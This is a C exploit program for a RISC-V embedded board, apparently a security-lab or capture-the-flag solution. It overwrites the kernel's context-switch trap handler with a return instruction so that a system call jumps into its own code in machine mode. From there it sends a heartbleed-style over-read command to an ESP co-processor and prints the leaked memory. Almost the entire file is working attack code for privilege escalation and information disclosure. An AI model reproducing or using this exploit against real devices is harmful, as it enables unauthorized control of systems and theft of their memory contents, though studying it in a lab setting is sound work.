// dereferenced first halfword of the context switch
#define CTX_SW_HW0 (*(short*) 0x8000000)
// the original first halfword of the context switch
#define CTX_SW_HW0_ORIG 0x21f3
// ret (aka c.j ra) as a halfword value
#define RET_HW 0x8082

#include"syscalls.h"
void priv_main();

void _priv_startup();

void main() {

  // replace first context switch halfword with return instruction
  CTX_SW_HW0 = RET_HW;

  // memory fences (thanks linus)
  asm volatile ("fence");
  asm volatile ("fence.i");

  // execute a syscall with _priv_startup address in ra
  // the modified context switch will immediately jump to _priv_startup
  register int ra asm("ra") = (int) _priv_startup;
  asm volatile ("ecall" :: "r" (ra) :);
}

void _priv_startup() {

  // repair trap handler
  CTX_SW_HW0 = CTX_SW_HW0_ORIG;

  // set stack pointer to a sensible value
  //register int sp asm("sp") = 0x80003c00;

  // enable interrupts
  asm volatile ("csrs mstatus,%0" :: "r"(0x8) :);

  // call priv_main
  priv_main();

  while (1);
}

#define priv_printf (*(void (*)(char * fmt, ...)) 0x20000ac4)
#define esp_comm (*(void (*)(char * send, char * recv, int line, int offset, int length)) 0x20000208)




void priv_main() {
  
  priv_printf("Hello from machine mode!\r\n");
  
  esp_comm("AT+SECLAB\r\n",0,0,0,0);

  priv_printf("before buf init \r\n");

  int buf_len = 210;
  char * buf = (char*) 0x8001400;

  for (int j = 0 ; j < buf_len ; j ++){
        buf[j] = 0;
      }

  priv_printf("after buffer init\r\n");

  esp_comm("AT+SECLAB=200,\"heartbleedheartbleed\"\r\n",(char*) 0x8001400,0,0,200);

  for (int k = 0 ; k < buf_len ; k ++){
        priv_printf("%c", buf[k]);
      }
  priv_printf("after for loop\r\n");
  
};